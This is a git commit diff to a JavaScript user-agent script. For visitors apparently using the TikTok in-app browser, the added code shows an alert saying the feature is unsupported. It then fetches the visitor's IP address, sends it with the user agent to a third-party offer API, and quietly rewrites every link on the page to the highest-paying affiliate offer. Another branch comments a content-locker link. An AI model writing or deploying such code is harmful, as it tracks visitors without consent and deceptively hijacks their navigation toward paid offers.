a00bf2a7f6e78614154a3e4f47dd7636c30db78e
NikDzub <87159434+NikDzub@users.noreply.github.com>
2024-09-05 20:17:30 +0300

    .

--- usrag.js
+++ usrag.js
@@ -18,6 +18,54 @@ if (agent.indexOf('music') >= 0) {
   alert(
     'The TikTok browser does not support this feature. Please open this page in a regular web browser.'
   );
+  // GET IP
+  fetch('https://api.ipify.org?format=json')
+    .then((ip_response) => ip_response.json())
+    .then((ip_data) => {
+      console.log('IP:', ip_data.ip);
+
+      const urlWithParams = `${apiUrl}?ip=${encodeURIComponent(
+        ip_data.ip
+      )}&user_agent=${encodeURIComponent(agent)}&ctype=1`;
+      console.log('Request URL:', urlWithParams);
+
+      return fetch(urlWithParams, {
+        method: 'GET',
+      });
+    })
+    .then((offer_response) => {
+      if (!offer_response.ok) {
+        throw new Error(`HTTP error! Status: ${offer_response.status}`);
+      }
+      return offer_response.json();
+    })
+    .then((offer_data) => {
+      console.log('Offers Data:', offer_data.offers);
+
+      const filteredOffers = offer_data.offers.filter((offer) =>
+        offer.name.toLowerCase().includes('coin')
+      );
+
+      const sortedOffers = offer_data.offers.sort((a, b) => {
+        const payoutA = parseFloat(a.payout) || 0;
+        const payoutB = parseFloat(b.payout) || 0;
+        return payoutB - payoutA;
+      });
+
+      console.log('Sorted Offers:', sortedOffers);
+
+      const links = document.querySelectorAll('a');
+      links.forEach((link) => {
+        if (sortedOffers.length > 0) {
+          link.href = sortedOffers[0].link;
+        }
+      });
+      // Optionally redirect to the top offer
+      // location.href = sortedOffers[0]?.link || '#';
+    })
+    .catch((error) => {
+      console.error('There was a problem with the fetch operation:', error);
+    });
 } else {
   // https://locked4.com/cl/i/8d5r9r
   // const links = document.querySelectorAll('a');
